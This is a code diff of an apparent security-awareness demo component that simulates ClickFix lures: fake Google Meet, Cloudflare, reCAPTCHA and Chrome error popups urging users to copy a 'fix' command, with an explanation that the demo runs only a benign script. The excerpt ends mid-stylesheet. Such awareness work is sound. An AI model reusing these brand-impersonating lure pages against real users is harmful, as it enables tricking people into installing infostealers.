@@ -1,7 +1,7 @@
 ---
 const baseUrl = import.meta.env.PROD
-  ? "https://clickfix.fyi"
-  : "http://localhost:4321";
+    ? "https://clickfix.fyi"
+    : "http://localhost:4321";
 
 // We reuse the existing benign scripts for "real" execution
 const SAFE_SCRIPT_WIN = `${baseUrl}/static/example.ps1`;
@@ -9,895 +9,1194 @@ const SAFE_SCRIPT_UNIX = `${baseUrl}/static/example.sh`;
 ---
 
 <div class="demo-wrapper" id="interactive-demo" data-base-url={baseUrl}>
-  <!-- Controls -->
-  <div class="demo-controls">
-    <div class="control-group">
-      <label for="scenario-select">Lure Scenario:</label>
-      <div class="select-wrapper">
-        <select id="scenario-select">
-          <option value="meet">Google Meet (Connection Error)</option>
-          <option value="cloudflare">Cloudflare (Verify Human)</option>
-          <option value="recaptcha">ReCAPTCHA (I'm not a robot)</option>
-          <option value="browser">Browser Error (Chrome Update)</option>
-        </select>
-        <svg class="select-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
-          <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd" />
-        </svg>
-      </div>
-    </div>
-
-    <div class="control-group">
-      <label for="platform-select">Target Platform:</label>
-      <div class="select-wrapper">
-        <select id="platform-select">
-          <option value="windows">Windows (PowerShell/Run)</option>
-          <option value="unix">macOS / Linux (Terminal)</option>
-        </select>
-        <svg class="select-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
-          <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd" />
-        </svg>
-      </div>
-    </div>
-
-    <div class="control-group">
-      <label for="variant-select">Payload Variant:</label>
-      <div class="select-wrapper">
-        <select id="variant-select">
-          <!-- Populated by JS based on platform -->
-        </select>
-        <svg class="select-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
-          <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd" />
-        </svg>
-      </div>
-    </div>
-  </div>
-
-  <!-- Simulation Stage -->
-  <div class="demo-stage" id="demo-stage-1">
-    
-    <!-- Scenario: Google Meet (Dark Mode) -->
-    <div class="scenario-ui hidden" id="ui-meet">
-      <div class="meet-wrapper">
-        <div class="meet-header">
-           <div class="meet-logo-area">
-             <img src="https://www.gstatic.com/meet/google_meet_horizontal_wordmark_2020q4_1x_icon_124_40_2373e79660dabbf194273d27aa7ee1f5.png" alt="Google Meet" height="24" />
-           </div>
+    <!-- Controls -->
+    <div class="demo-controls">
+        <div class="control-group">
+            <label for="scenario-select">Lure Scenario:</label>
+            <div class="select-wrapper">
+                <select id="scenario-select">
+                    <option value="meet">Google Meet (Connection Error)</option>
+                    <option value="cloudflare">Cloudflare (Verify Human)</option
+                    >
+                    <option value="recaptcha"
+                        >ReCAPTCHA (I'm not a robot)</option
+                    >
+                    <option value="browser"
+                        >Browser Error (Chrome Update)</option
+                    >
+                </select>
+                <svg
+                    class="select-icon"
+                    xmlns="http://www.w3.org/2000/svg"
+                    viewBox="0 0 20 20"
+                    fill="currentColor"
+                >
+                    <path
+                        fill-rule="evenodd"
+                        d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"
+                        clip-rule="evenodd"></path>
+                </svg>
+            </div>
         </div>
-        <div class="meet-body">
-            <div class="meet-main-content">
-                <div class="meet-video-placeholder">
-                    <div class="meet-video-text">No camera found</div>
-                    <div class="meet-controls">
-                        <div class="meet-btn-circle red"></div>
-                        <div class="meet-btn-circle red"></div>
-                    </div>
 
-                    <!-- The Lure Popup -->
-                    <div class="meet-popup">
-                        <div class="meet-popup-header">
-                            <span class="meet-bell-icon">🔔</span> Problems detected
-                            <span class="meet-popup-menu">⋮</span>
-                        </div>
-                        <div class="meet-popup-body">
-                            <p>Problems have been detected with your microphone and headset. Click <strong>Fix it</strong> button and follow steps.</p>
-                            <div class="meet-actions">
-                                <button class="btn-meet-fix btn-fake-copy">Fix it</button>
-                                <button class="btn-meet-try-again">Try again</button>
+        <div class="control-group">
+            <label for="platform-select">Target Platform:</label>
+            <div class="select-wrapper">
+                <select id="platform-select">
+                    <option value="windows">Windows (PowerShell/Run)</option>
+                    <option value="unix">macOS / Linux (Terminal)</option>
+                </select>
+                <svg
+                    class="select-icon"
+                    xmlns="http://www.w3.org/2000/svg"
+                    viewBox="0 0 20 20"
+                    fill="currentColor"
+                >
+                    <path
+                        fill-rule="evenodd"
+                        d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"
+                        clip-rule="evenodd"></path>
+                </svg>
+            </div>
+        </div>
+
+        <div class="control-group">
+            <label for="variant-select">Payload Variant:</label>
+            <div class="select-wrapper">
+                <select id="variant-select">
+                    <!-- Populated by JS based on platform -->
+                </select>
+                <svg
+                    class="select-icon"
+                    xmlns="http://www.w3.org/2000/svg"
+                    viewBox="0 0 20 20"
+                    fill="currentColor"
+                >
+                    <path
+                        fill-rule="evenodd"
+                        d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"
+                        clip-rule="evenodd"></path>
+                </svg>
+            </div>
+        </div>
+    </div>
+
+    <!-- Simulation Stage -->
+    <div class="demo-stage" id="demo-stage-1">
+        <!-- Scenario: Google Meet (Dark Mode) -->
+        <div class="scenario-ui hidden" id="ui-meet">
+            <div class="meet-wrapper">
+                <div class="meet-header">
+                    <div class="meet-logo-area">
+                        <img
+                            src="https://www.gstatic.com/meet/google_meet_horizontal_wordmark_2020q4_1x_icon_124_40_2373e79660dabbf194273d27aa7ee1f5.png"
+                            alt="Google Meet"
+                            height="24"
+                        />
+                    </div>
+                </div>
+                <div class="meet-body">
+                    <div class="meet-main-content">
+                        <div class="meet-video-placeholder">
+                            <div class="meet-video-text">No camera found</div>
+                            <div class="meet-controls">
+                                <div class="meet-btn-circle red"></div>
+                                <div class="meet-btn-circle red"></div>
+                            </div>
+
+                            <!-- The Lure Popup -->
+                            <div class="meet-popup">
+                                <div class="meet-popup-header">
+                                    <span class="meet-bell-icon">🔔</span> Problems
+                                    detected
+                                    <span class="meet-popup-menu">⋮</span>
+                                </div>
+                                <div class="meet-popup-body">
+                                    <p>
+                                        Problems have been detected with your
+                                        microphone and headset. Click <strong
+                                            >Fix it</strong
+                                        > button and follow steps.
+                                    </p>
+                                    <div class="meet-actions">
+                                        <button
+                                            class="btn-meet-fix btn-fake-copy"
+                                            >Fix it</button
+                                        >
+                                        <button class="btn-meet-try-again"
+                                            >Try again</button
+                                        >
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Step 2 Popup (Hidden initially) -->
+                            <div class="meet-popup hidden" id="meet-step-2">
+                                <div class="meet-popup-header">
+                                    <span class="meet-bell-icon">🔔</span> Problems
+                                    detected
+                                </div>
+                                <div class="meet-popup-body">
+                                    <div
+                                        class="instruction-text instruction-meet"
+                                    >
+                                    </div>
+                                    <div class="meet-actions">
+                                        <button
+                                            class="btn-meet-fix btn-fake-copy"
+                                            >Copy Fix</button
+                                        >
+                                        <button class="btn-meet-try-again"
+                                            >Try again</button
+                                        >
+                                    </div>
+                                </div>
                             </div>
                         </div>
-                    </div>
 
-                    <!-- Step 2 Popup (Hidden initially) -->
-                    <div class="meet-popup hidden" id="meet-step-2">
-                        <div class="meet-popup-header">
-                            <span class="meet-bell-icon">🔔</span> Problems detected
-                        </div>
-                        <div class="meet-popup-body">
-                            <div class="instruction-text instruction-meet"></div>
-                            <div class="meet-actions">
-                                <button class="btn-meet-fix btn-fake-copy">Copy Fix</button>
-                                <button class="btn-meet-try-again">Try again</button>
-                            </div>
+                        <div class="meet-sidebar">
+                            <h3>Ready to join?</h3>
+                            <button class="meet-join-btn">Join now</button>
                         </div>
                     </div>
                 </div>
-                
-                <div class="meet-sidebar">
-                   <h3>Ready to join?</h3>
-                   <button class="meet-join-btn">Join now</button>
+            </div>
+        </div>
+
+        <!-- Scenario: Cloudflare (Human Verify) -->
+        <div class="scenario-ui hidden" id="ui-cloudflare">
+            <div class="cloudflare-wrapper">
+                <div class="cloudflare-header">
+                    <div class="cf-left">Verifying you are human</div>
+                    <div class="cf-logo">CLOUDFLARE</div>
+                </div>
+                <div class="cloudflare-body">
+                    <div class="cf-step" id="cf-step-1">
+                        <p class="cf-subtext">This may take a few seconds</p>
+                        <div class="cf-checkbox-row">
+                            <input
+                                type="checkbox"
+                                id="cf-check"
+                                class="cf-checkbox"
+                            />
+                            <label for="cf-check">Verify you are human</label>
+                        </div>
+                        <div class="cf-loading hidden" id="cf-loading">
+                            <div class="spinner"></div> Verifying...
+                        </div>
+                    </div>
+
+                    <div class="cf-instructions hidden" id="cf-step-2">
+                        <div class="cf-instruction-box">
+                            <div class="instruction-text instruction-cf"></div>
+                            <button class="cf-copy-btn btn-fake-copy"
+                                >Copy Verification</button
+                            >
+                        </div>
+                    </div>
                 </div>
             </div>
         </div>
-      </div>
-    </div>
 
-    <!-- Scenario: Cloudflare (Human Verify) -->
-    <div class="scenario-ui hidden" id="ui-cloudflare">
-      <div class="cloudflare-wrapper">
-          <div class="cloudflare-header">
-              <div class="cf-left">Verifying you are human</div>
-              <div class="cf-logo">CLOUDFLARE</div>
-          </div>
-          <div class="cloudflare-body">
-             <div class="cf-step" id="cf-step-1">
-                 <p class="cf-subtext">This may take a few seconds</p>
-                 <div class="cf-checkbox-row">
-                    <input type="checkbox" id="cf-check" class="cf-checkbox" />
-                    <label for="cf-check">Verify you are human</label>
-                 </div>
-                 <div class="cf-loading hidden" id="cf-loading">
-                    <div class="spinner"></div> Verifying...
-                 </div>
-             </div>
-
-             <div class="cf-instructions hidden" id="cf-step-2">
-                 <div class="cf-instruction-box">
-                    <div class="instruction-text instruction-cf"></div>
-                    <button class="cf-copy-btn btn-fake-copy">Copy Verification</button>
-                 </div>
-             </div>
-          </div>
-      </div>
-    </div>
-
-    <!-- Scenario: ReCAPTCHA -->
-    <div class="scenario-ui hidden" id="ui-recaptcha">
-      <div class="recaptcha-wrapper">
-         <div class="recaptcha-box">
-             <div class="rc-checkbox-area">
-                <input type="checkbox" id="rc-check" class="rc-checkbox" />
-                <label for="rc-check">I'm not a robot</label>
-             </div>
-             <div class="rc-logo-area">
-                 <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="" width="32" height="32" />
-                 <div class="rc-text">reCAPTCHA</div>
-                 <div class="rc-links">Privacy - Terms</div>
-             </div>
-         </div>
-         
-         <div class="rc-instructions hidden" id="rc-step-2">
-             <p class="rc-verify-title">Verification Steps:</p>
-             <div class="instruction-text instruction-rc"></div>
-             <button class="rc-verify-btn btn-fake-copy">Verify</button>
-         </div>
-      </div>
-    </div>
-
-    <!-- Scenario: Browser Update (Chrome) -->
-    <div class="scenario-ui hidden" id="ui-browser">
-        <div class="chrome-alert">
-            <div class="chrome-header">
-                <!-- Chrome Logo Icon -->
-                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Google_Chrome_icon_%28February_2022%29.svg" alt="Chrome" width="24" height="24" style="margin-right: 8px;" />
-                <strong>Google Chrome</strong>
-            </div>
-            <div class="chrome-body">
-                <h3>Something went wrong while displaying this webpage.</h3>
-                <p>There was an error during the latest update of browser version, causing some web pages to malfunction.</p>
-                
-                <div class="chrome-steps">
-                    <p><strong>Follow these instructions to resolve the issue:</strong></p>
-                    <div class="instruction-text instruction-browser" style="margin-left: 1rem; line-height: 1.6;"></div>
+        <!-- Scenario: ReCAPTCHA -->
+        <div class="scenario-ui hidden" id="ui-recaptcha">
+            <div class="recaptcha-wrapper">
+                <div class="recaptcha-box">
+                    <div class="rc-checkbox-area">
+                        <input
+                            type="checkbox"
+                            id="rc-check"
+                            class="rc-checkbox"
+                        />
+                        <label for="rc-check">I'm not a robot</label>
+                    </div>
+                    <div class="rc-logo-area">
+                        <img
+                            src="https://www.gstatic.com/recaptcha/api2/logo_48.png"
+                            alt=""
+                            width="32"
+                            height="32"
+                        />
+                        <div class="rc-text">reCAPTCHA</div>
+                        <div class="rc-links">Privacy - Terms</div>
+                    </div>
                 </div>
 
-                <div class="chrome-actions">
-                    <button class="chrome-btn-blue btn-fake-copy">Copy fix</button>
-                    <button class="chrome-btn-grey">Close</button>
+                <div class="rc-instructions hidden" id="rc-step-2">
+                    <p class="rc-verify-title">Verification Steps:</p>
+                    <div class="instruction-text instruction-rc"></div>
+                    <button class="rc-verify-btn btn-fake-copy">Verify</button>
                 </div>
             </div>
         </div>
-    </div>
 
-    <!-- Explanation Box (Bottom) -->
-    <div class="demo-explanation hidden" id="explanation-box">
-        <div class="expl-header">
-          <h4>🚨 Simulation: What was copied to your clipboard?</h4>
-          <button id="close-expl" class="close-expl">×</button>
+        <!-- Scenario: Browser Update (Chrome) -->
+        <div class="scenario-ui hidden" id="ui-browser">
+            <div class="chrome-alert">
+                <div class="chrome-header">
+                    <!-- Chrome Logo Icon -->
+                    <img
+                        src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Google_Chrome_icon_%28February_2022%29.svg"
+                        alt="Chrome"
+                        width="24"
+                        height="24"
+                        style="margin-right: 8px;"
+                    />
+                    <strong>Google Chrome</strong>
+                </div>
+                <div class="chrome-body">
+                    <h3>Something went wrong while displaying this webpage.</h3>
+                    <p>
+                        There was an error during the latest update of browser
+                        version, causing some web pages to malfunction.
+                    </p>
+
+                    <div class="chrome-steps">
+                        <p>
+                            <strong
+                                >Follow these instructions to resolve the issue:</strong
+                            >
+                        </p>
+                        <div
+                            class="instruction-text instruction-browser"
+                            style="margin-left: 1rem; line-height: 1.6;"
+                        >
+                        </div>
+                    </div>
+
+                    <div class="chrome-actions">
+                        <button class="chrome-btn-blue btn-fake-copy"
+                            >Copy fix</button
+                        >
+                        <button class="chrome-btn-grey">Close</button>
+                    </div>
+                </div>
+            </div>
         </div>
-        <p>If you were a victim, you would have just pasted this malicious command:</p>
-        <div class="payload-display">
-            <code id="payload-code"></code>
-        </div>
-        <div class="alert-box">
-            <strong>⚠️ Reality Check:</strong> The command above executes a hidden script. <br/>
-            In this demo, it runs a <strong>benign local file</strong> (`example.ps1` or `example.sh`). <br/>
-            In a real attack, this would install infostealers like Lumma or RedLine immediately.
+
+        <!-- Explanation Box (Bottom) -->
+        <div class="demo-explanation hidden" id="explanation-box">
+            <div class="expl-header">
+                <h4>🚨 Simulation: What was copied to your clipboard?</h4>
+                <button id="close-expl" class="close-expl">×</button>
+            </div>
+            <p>
+                If you were a victim, you would have just pasted this malicious
+                command:
+            </p>
+            <div class="payload-display">
+                <code id="payload-code"></code>
+            </div>
+            <div class="alert-box">
+                <strong>⚠️ Reality Check:</strong> The command above executes a hidden
+                script. <br />
+                In this demo, it runs a <strong>benign local file</strong> (`example.ps1`
+                or `example.sh`). <br />
+                In a real attack, this would install infostealers like Lumma or RedLine
+                immediately.
+            </div>
         </div>
     </div>
-
-  </div>
 </div>
 
 <style>
-  /* Base Layout */
-  .demo-wrapper {
-    max-width: 1000px;
-    margin: 0 auto;
-    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-  }
-  
-  .hidden { display: none !important; }
+    /* Base Layout */
+    .demo-wrapper {
+        max-width: 1000px;
+        margin: 0 auto;
+        font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
 
-  /* Controls */
-  .demo-controls {
-    display: flex;
-    flex-wrap: wrap;
-    gap: 1rem;
-    padding: 1.5rem;
-    background: white;
-    border: 1px solid #e5e7eb;
-    border-radius: 8px;
-    margin-bottom: 2rem;
-    box-shadow: 0 1px 3px rgba(0,0,0,0.05);
-  }
-  .control-group { flex: 1; min-width: 200px; }
-  .control-group label {
-      display: block;
-      font-size: 0.8rem;
-      font-weight: 700;
-      color: #374151;
-      margin-bottom: 0.4rem;
-      text-transform: uppercase;
-      letter-spacing: 0.05em;
-  }
-  .select-wrapper { position: relative; }
-  select {
-      width: 100%;
-      padding: 0.6rem 2.5rem 0.6rem 0.8rem;
-      border: 1px solid #d1d5db;
-      border-radius: 6px;
-      background: #f9fafb;
-      font-size: 0.95rem;
-      color: #111827;
-      appearance: none;
-      cursor: pointer;
-  }
-  select:focus { outline: 2px solid #2563eb; border-color: #2563eb; }
-  .select-icon {
-      position: absolute;
-      right: 0.8rem;
-      top: 50%;
-      transform: translateY(-50%);
-      width: 1.25rem;
-      height: 1.25rem;
-      color: #6b7280;
-      pointer-events: none;
-  }
+    .hidden {
+        display: none !important;
+    }
 
-  /* Stage */
-  .demo-stage {
-    min-height: 500px;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    position: relative;
-    padding: 2rem;
-    background: #f3f4f6; /* Neutral background for stage */
-    border-radius: 12px;
-    border: 1px dashed #cbd5e1;
-  }
-  .scenario-ui { width: 100%; max-width: 900px; }
+    /* Controls */
+    .demo-controls {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 1rem;
+        padding: 1.5rem;
+        background: white;
+        border: 1px solid #e5e7eb;
+        border-radius: 8px;
+        margin-bottom: 2rem;
+        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
+    }
+    @media (max-width: 640px) {
+        .demo-controls {
+            flex-direction: column;
+            gap: 1rem;
+        }
+        .control-group {
+            min-width: 100%;
+        }
+    }
+    .control-group {
+        flex: 1;
+        min-width: 200px;
+    }
+    .control-group label {
+        display: block;
+        font-size: 0.8rem;
+        font-weight: 700;
+        color: #374151;
+        margin-bottom: 0.4rem;
+        text-transform: uppercase;
+        letter-spacing: 0.05em;
+    }
+    .select-wrapper {
+        position: relative;
+    }
+    select {
+        width: 100%;
+        padding: 0.6rem 2.5rem 0.6rem 0.8rem;
+        border: 1px solid #d1d5db;
+        border-radius: 6px;
+        background: #f9fafb;
+        font-size: 0.95rem;
+        color: #111827;
+        appearance: none;
+        cursor: pointer;
+    }
+    select:focus {
+        outline: 2px solid #2563eb;
+        border-color: #2563eb;
+    }
+    .select-icon {
+        position: absolute;
+        right: 0.8rem;
+        top: 50%;
+        transform: translateY(-50%);
+        width: 1.25rem;
+        height: 1.25rem;
+        color: #6b7280;
+        pointer-events: none;
+    }
 
-  /** 
+    /* Stage */
+    .demo-stage {
+        min-height: 500px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        position: relative;
+        padding: 2rem;
+        background: #f3f4f6; /* Neutral background for stage */
+        border-radius: 12px;
+        border: 1px dashed #cbd5e1;
+    }
+    @media (max-width: 640px) {
+        .demo-stage {
+            padding: 1rem;
+            min-height: 400px;
+        }
+    }
+    .scenario-ui {
+        width: 100%;
+        max-width: 900px;
+    }
+
+    /** 
    * SCENARIO: GOOGLE MEET (Dark Mode)
    */
-  .meet-wrapper {
-      background: #202124;
-      color: white;
-      height: 500px;
-      display: flex;
-      flex-direction: column;
-      border-radius: 8px;
-      overflow: hidden;
-      font-family: 'Google Sans', Roboto, Arial, sans-serif;
-  }
-  .meet-header {
-      padding: 0.8rem 1.5rem;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-  }
-  .meet-body {
-      flex: 1;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 2rem;
-  }
-  .meet-main-content {
-      display: flex;
-      gap: 2rem;
-      width: 100%;
-      max-width: 900px;
-      align-items: center;
-  }
-  .meet-video-placeholder {
-     flex: 2;
-     background: #3c4043;
-     border-radius: 8px;
-     height: 350px;
-     position: relative;
-     display: flex;
-     align-items: center;
-     justify-content: center;
-     flex-direction: column;
-  }
-  .meet-video-text { font-size: 1.2rem; color: #e8eaed; margin-bottom: 2rem; }
-  .meet-controls { display: flex; gap: 1rem; }
-  .meet-btn-circle {
-      width: 40px; height: 40px; border-radius: 50%;
-      background: #ea4335; /* Red mute buttons */
-      opacity: 0.8;
-  }
-  
-  /* LURE POPUP */
-  .meet-popup {
-      position: absolute;
-      bottom: 20px;
-      right: 20px;
-      background: white;
-      color: #202124;
-      width: 320px;
-      border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
-      z-index: 10;
-      animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1);
-  }
-  .meet-popup-header {
-      padding: 12px 16px;
-      font-weight: 500;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      border-bottom: 1px solid #dadce0;
-      font-size: 0.95rem;
-  }
-  #meet-step-2 .meet-popup-header {
-      justify-content: center;
-  }
-  .meet-bell-icon { margin-right: 8px; }
-  .meet-popup-menu { color: #5f6368; cursor: pointer; }
-  .meet-popup-body { padding: 16px; font-size: 0.9rem; line-height: 1.5; }
-  .meet-actions {
-      margin-top: 16px;
-      display: flex;
-      gap: 8px;
-      justify-content: flex-end;
-  }
-  .btn-meet-fix {
-      background: transparent;
-      color: #1a73e8;
-      border: none;
-      font-weight: 500;
-      cursor: pointer;
-      padding: 8px 16px;
-  }
-  .btn-meet-fix:hover { background: #f1f3f4; border-radius: 4px; }
-  .btn-meet-try-again {
-      background: transparent;
-      color: #1a73e8;
-      border: none;
-      font-weight: 500;
-      cursor: pointer;
-      padding: 8px 16px;
-  }
-  
-  .meet-sidebar {
-      flex: 1;
-      color: #e8eaed;
-      text-align: center;
-  }
-  .meet-sidebar h3 { font-size: 1.7rem; font-weight: 400; margin-bottom: 2rem; }
-  .meet-join-btn {
-      background: #8ab4f8;
-      color: #202124;
-      border: none;
-      padding: 12px 24px;
-      border-radius: 24px;
-      font-weight: 500;
-      font-size: 1rem;
-      cursor: pointer;
-  }
+    .meet-wrapper {
+        background: #202124;
+        color: white;
+        height: 500px;
+        display: flex;
+        flex-direction: column;
+        border-radius: 8px;
+        overflow: hidden;
+        font-family: "Google Sans", Roboto, Arial, sans-serif;
+    }
+    .meet-header {
+        padding: 0.8rem 1.5rem;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+    .meet-body {
+        flex: 1;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 2rem;
+    }
+    .meet-main-content {
+        display: flex;
+        gap: 2rem;
+        width: 100%;
+        max-width: 900px;
+        align-items: center;
+    }
+    @media (max-width: 800px) {
+        .meet-main-content {
+            flex-direction: column;
+            gap: 1rem;
+        }
+        .meet-sidebar {
+            width: 100%;
+            padding-bottom: 2rem;
+            padding-top: 0;
+        }
+        .meet-video-placeholder {
+            width: 100%;
+            min-height: 320px; /* Increased height for popup breathing room */
+            height: auto;
+        }
+        .meet-wrapper {
+            height: auto;
+            min-height: auto; /* Allow natural growth */
+            padding-bottom: 2rem;
+        }
+        .meet-controls {
+            margin-bottom: 50px; /* Push controls up slightly to avoid popup overlap */
+        }
+    }
+    .meet-video-placeholder {
+        flex: 2;
+        background: #3c4043;
+        border-radius: 8px;
+        height: 350px;
+        position: relative;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-direction: column;
+    }
+    .meet-video-text {
+        font-size: 1.2rem;
+        color: #e8eaed;
+        margin-bottom: 2rem;
+    }
+    .meet-controls {
+        display: flex;
+        gap: 1rem;
+    }
+    .meet-btn-circle {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        background: #ea4335; /* Red mute buttons */
+        opacity: 0.8;
+    }
 
-  /**
+    /* LURE POPUP */
+    .meet-popup {
+        position: absolute;
+        bottom: 20px;
+        right: 20px;
+        background: white;
+        color: #202124;
+        width: 320px;
+        border-radius: 8px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+        z-index: 10;
+        animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+    @media (max-width: 480px) {
+        .meet-popup {
+            left: 50%;
+            right: auto;
+            transform: translateX(-50%);
+            bottom: 20px;
+            width: 92%;
+            max-width: 350px; /* Prevent it from getting too wide on slightly larger phones */
+        }
+        /* Override animation for centered popup */
+        @keyframes slideUpMobile {
+            from {
+                opacity: 0;
+                transform: translate(-50%, 20px);
+            }
+            to {
+                opacity: 1;
+                transform: translate(-50%, 0);
+            }
+        }
+    }
+    .meet-popup-header {
+        padding: 12px 16px;
+        font-weight: 500;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        border-bottom: 1px solid #dadce0;
+        font-size: 0.95rem;
+    }
+    #meet-step-2 .meet-popup-header {
+        justify-content: center;
+    }
+    .meet-bell-icon {
+        margin-right: 8px;
+    }
+    .meet-popup-menu {
+        color: #5f6368;
+        cursor: pointer;
+    }
+    .meet-popup-body {
+        padding: 16px;
+        font-size: 0.9rem;
+        line-height: 1.5;
+    }
+    .meet-actions {
+        margin-top: 16px;
+        display: flex;
+        gap: 8px;
+        justify-content: flex-end;
+    }
+    .btn-meet-fix {
+        background: transparent;
+        color: #1a73e8;
+        border: none;
+        font-weight: 500;
+        cursor: pointer;
+        padding: 8px 16px;
+    }
+    .btn-meet-fix:hover {
+        background: #f1f3f4;
+        border-radius: 4px;
+    }
+    .btn-meet-try-again {
+        background: transparent;
+        color: #1a73e8;
+        border: none;
+        font-weight: 500;
+        cursor: pointer;
+        padding: 8px 16px;
+    }
+
+    .meet-sidebar {
+        flex: 1;
+        color: #e8eaed;
+        text-align: center;
+    }
+    .meet-sidebar h3 {
+        font-size: 1.7rem;
+        font-weight: 400;
+        margin-bottom: 2rem;
+    }
+    .meet-join-btn {
+        background: #8ab4f8;
+        color: #202124;
+        border: none;
+        padding: 12px 24px;
+        border-radius: 24px;
+        font-weight: 500;
+        font-size: 1rem;
+        cursor: pointer;
+    }
+
+    /**
    * SCENARIO: CLOUDFLARE
    */
-  .cloudflare-wrapper {
-      background: white;
-      max-width: 500px;
-      margin: 0 auto;
-      box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1), 0 2px 4px -1px rgba(0,0,0,0.06);
-      border-radius: 4px;
-      overflow: hidden;
-      font-family: system-ui, -apple-system, sans-serif;
-  }
-  .cloudflare-header {
-      background: #f48120; /* Cloudflare Orange */
-      color: white;
-      padding: 1rem 1.5rem;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-  }
-  .cf-left { font-weight: 600; font-size: 1.1rem; }
-  .cf-logo { font-weight: 800; font-size: 0.9rem; letter-spacing: 0.05em; }
-  .cloudflare-body { padding: 2rem; }
-  .cf-subtext { color: #4b5563; margin-bottom: 1.5rem; font-size: 0.95rem; }
-  
-  .cf-checkbox-row {
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-      padding: 1rem;
-      background: #f9fafb;
-      border: 1px solid #e5e7eb;
-      border-radius: 4px;
-      margin-bottom: 1rem;
-  }
-  .cf-checkbox { width: 24px; height: 24px; cursor: pointer; }
-  .cf-checkbox-row label { font-size: 1.1rem; color: #374151; cursor: pointer; }
-  
-  .cf-instruction-box {
-      background: #fff7ed;
-      border: 1px solid #fdba74;
-      padding: 1rem;
-      border-radius: 6px;
-      animation: fadeIn 0.3s;
-  }
+    .cloudflare-wrapper {
+        background: white;
+        max-width: 500px;
+        margin: 0 auto;
+        box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1),
+            0 2px 4px -1px rgba(0, 0, 0, 0.06);
+        border-radius: 4px;
+        overflow: hidden;
+        font-family: system-ui, -apple-system, sans-serif;
+    }
+    @media (max-width: 520px) {
+        .cloudflare-wrapper {
+            width: 100%;
+            max-width: 100%;
+            border-radius: 0;
+            box-shadow: none;
+        }
+    }
+    .cloudflare-header {
+        background: #f48120; /* Cloudflare Orange */
+        color: white;
+        padding: 1rem 1.5rem;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+    .cf-left {
+        font-weight: 600;
+        font-size: 1.1rem;
+    }
+    .cf-logo {
+        font-weight: 800;
+        font-size: 0.9rem;
+        letter-spacing: 0.05em;
+    }
+    .cloudflare-body {
+        padding: 2rem;
+    }
+    .cf-subtext {
+        color: #4b5563;
+        margin-bottom: 1.5rem;
+        font-size: 0.95rem;
+    }
 
-  .cf-copy-btn {
-      width: 100%;
-      background: #f48120;
-      color: white;
-      border: none;
-      padding: 0.75rem;
-      font-weight: 600;
-      border-radius: 4px;
-      cursor: pointer;
-      margin-top: 1rem;
-  }
-  .cf-copy-btn:hover { background: #ea580c; }
+    .cf-checkbox-row {
+        display: flex;
+        align-items: center;
+        gap: 1rem;
+        padding: 1rem;
+        background: #f9fafb;
+        border: 1px solid #e5e7eb;
+        border-radius: 4px;
+        margin-bottom: 1rem;
+    }
+    .cf-checkbox {
+        width: 24px;
+        height: 24px;
+        cursor: pointer;
+    }
+    .cf-checkbox-row label {
+        font-size: 1.1rem;
+        color: #374151;
+        cursor: pointer;
+    }
 
-  /**
+    .cf-instruction-box {
+        background: #fff7ed;
+        border: 1px solid #fdba74;
+        padding: 1rem;
+        border-radius: 6px;
+        animation: fadeIn 0.3s;
+    }
+
+    .cf-copy-btn {
+        width: 100%;
+        background: #f48120;
+        color: white;
+        border: none;
+        padding: 0.75rem;
+        font-weight: 600;
+        border-radius: 4px;
+        cursor: pointer;
+        margin-top: 1rem;
+    }
+    .cf-copy-btn:hover {
+        background: #ea580c;
+    }
+
+    /**
    * SCENARIO: RECAPTCHA
    */
-   /**
+    /**
    * SCENARIO: RECAPTCHA
    */
-   .recaptcha-wrapper {
-       margin: 0 auto;
